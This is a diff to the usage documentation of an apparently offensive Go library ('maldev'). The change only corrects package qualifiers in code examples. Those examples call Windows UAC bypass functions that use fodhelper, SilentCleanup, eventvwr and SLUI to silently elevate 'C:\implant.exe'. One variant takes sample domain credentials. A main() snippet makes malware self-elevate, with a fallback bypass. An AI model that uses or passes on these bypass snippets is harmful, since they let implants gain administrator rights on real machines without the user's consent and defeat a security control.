@@ -133,28 +133,28 @@ err := privilege.ShellExecuteRunAs(
 import "github.com/oioio-space/maldev/privesc/uac"
 
 // Silently elevate via fodhelper.exe (Win10+, no UAC prompt)
-err := privesc/uac.FODHelper(`C:\implant.exe`)
+err := uac.FODHelper(`C:\implant.exe`)
 ```
 
 ### UAC Bypass: SilentCleanup
 
 ```go
 // Silently elevate via SilentCleanup scheduled task
-err := privesc/uac.SilentCleanup(`C:\implant.exe`)
+err := uac.SilentCleanup(`C:\implant.exe`)
 ```
 
 ### UAC Bypass: EventVwr
 
 ```go
 // Silently elevate via eventvwr.exe mscfile handler
-err := privesc/uac.EventVwr(`C:\implant.exe`)
+err := uac.EventVwr(`C:\implant.exe`)
 ```
 
 ### UAC Bypass: EventVwr with Alternate Credentials
 
 ```go
 // Elevate via eventvwr.exe using another user's credentials
-err := privesc/uac.EventVwrLogon("CORP", "admin", "Password123!", `C:\implant.exe`)
+err := uac.EventVwrLogon("CORP", "admin", "Password123!", `C:\implant.exe`)
 ```
 
 ### Check Current Privileges
@@ -192,9 +192,9 @@ func main() {
     if !elevated {
         // Self-elevate via FODHelper UAC bypass
         exePath, _ := os.Executable()
-        if err := privesc/uac.FODHelper(exePath); err != nil {
+        if err := uac.FODHelper(exePath); err != nil {
             fmt.Println("UAC bypass failed, trying SLUI...")
-            privesc/uac.SLUI(exePath)
+            uac.SLUI(exePath)
         }
         return // original process exits, elevated copy continues
     }
